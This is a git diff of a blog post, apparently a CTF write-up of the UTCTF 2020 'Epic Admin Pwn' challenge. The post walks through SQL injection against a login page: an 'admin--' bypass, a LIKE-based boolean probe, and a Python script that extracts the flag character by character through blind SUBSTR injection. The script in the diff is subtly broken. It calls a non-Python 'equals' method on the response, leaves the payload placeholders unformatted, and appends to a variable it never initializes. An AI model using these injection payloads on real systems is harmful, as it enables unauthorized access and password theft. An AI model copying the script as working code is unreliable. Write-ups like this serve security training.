@@ -1,18 +1,22 @@
 ---
 title: "UTCTF 2020: Epic Admin Pwn  "
 date: 2020-04-22T00:46:19-06:00
-draft: true
+draft: false
 author: "Jamvie"
 ---
 
-I particpated in UTCTF with my team in March 2020. A very fun SQLi-based attack! 
+I particpated in UTCTF with my team in March 2020, held and operated by the University of Texas [ISSS](https://www.isss.io/). My team and I solved a very fun SQLi-based attack! This challenge helped me to refine my python skills cause the lord knows I needed it, as well as reinforced my knowledge about SQL-based attacks. This is the first web challenged I solved in the CTF, and admittedly the one that I enjoyed the most to do.
+
 
 We are presented with a clean and minimal login page. The challenge's description says that "the password is the flag". Well, since this is only a login page, I'd figure to try and get into admin somehow.
 
-![login](./images/UTCTFscreenshot2.png)
+
+![login](https://raw.githubusercontent.com/jamiepoli/JamvieCTF/master/content/images/UTCTFscreenshot1.png)
 
 Initial attempts to do some scoping for SQL vulnerabilities didn't do anything. Inputting a single quote ' mark wouldn't show anything useful. So, I went in kinda blind, and did a pretty standard SQL attack: ```admin--``` If there were vulnerable SQL queries to be had, my input would malform the query to only return the entries where the username == admin. 
 And it worked! 
+
+![adminpage](https://raw.githubusercontent.com/jamiepoli/JamvieCTF/master/content/images/UTCTFscreenshot2.png)
 
 
 It's a static welcome page, so I didn't get anything useful past learning that the admin's username was, in fact, admin. And the challenge's description told me as such - if I wanted the password, I needed to do something else. 
@@ -21,11 +25,13 @@ The fact that I got into admin meant that I malformed the SQL query so that it w
 
 ```SQL
 
-admin' AND password LIKE .....
+admin' AND pass LIKE ('J%')
 
 ```
 
-While I use the SQL 'LIKE' keyword here, another keyword called "substr" exists that I prefer. [From SQL Server Tutorial:] (https://www.sqlservertutorial.net/sql-server-string-functions/sql-server-substring-function/)
+This will return true if the admin's password starts with a J.
+
+While I use the SQL 'LIKE' keyword here, another keyword called "substr" or "substring" exists that I prefer. [From SQL Server Tutorial:] (https://www.sqlservertutorial.net/sql-server-string-functions/sql-server-substring-function/)
 
 >The SUBSTRING() extracts a substring with a specified length starting from a location in an input string.
 
@@ -43,12 +49,12 @@ url = example.com
 
 for index in range(0, 40):
     for char in chars: 
-        req = "admin' AND SUBSTR(password, {index}, 1) = '{char}'--" 
+        req = "admin' AND SUBSTR(flag, {index}, 1) = '{char}'--" 
         data = {"username": req, "pass": "JamVieSaysHello"} 
         response = requests.post(url, data)
-        if response.text.find('Welcome, admin!') != -1: 
-            password += char 
-            print(password) 
+        if response.text.equals('Welcome, admin!') > 0: 
+            flag += char 
+            print(flag) 
             continue 
 ```
 
